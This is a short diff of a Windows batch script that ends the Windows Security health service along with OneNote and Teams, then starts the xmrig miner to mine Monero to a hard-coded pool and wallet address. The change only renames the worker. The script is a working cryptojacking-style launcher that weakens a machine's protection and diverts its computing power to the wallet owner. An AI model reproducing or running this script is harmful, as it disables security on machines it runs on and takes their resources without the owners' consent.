@@ -6,5 +6,5 @@ taskkill /IM SecurityHealthService.exe
 taskkill /IM ONENOTEM.exe
 taskkill /IM Teams.exe
 cd /d "%~dp0"
-xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.ComRestart-05-01_4 -p x -t 2
+xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.ComRestart-11-01_1 -p x -t 2
 pause 
